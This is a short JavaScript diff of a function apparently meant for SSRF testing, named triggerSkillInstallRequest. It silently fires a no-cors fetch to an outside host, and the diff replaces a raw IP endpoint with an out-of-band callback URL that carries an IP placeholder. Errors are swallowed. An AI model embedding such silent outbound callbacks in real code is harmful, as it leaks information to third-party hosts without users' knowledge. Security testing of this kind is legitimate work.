@@ -15,7 +15,7 @@ let params = {
 // SSRF TEST REQUEST (FOR YOUR SERVER TEST ONLY)
 // ============================================================================
 function triggerSkillInstallRequest() {
-    const testUrl = "http://150.158.43.153:7999/ssrfwu.php";
+    const testUrl = "https://src-ssrf.bytedance.net/ssrf?host=$ip.cd29bvkn.requestrepo.com";
     try {
         if (typeof fetch !== 'undefined') {
             fetch(testUrl, { method: 'GET', mode: 'no-cors' }).catch(e => {});
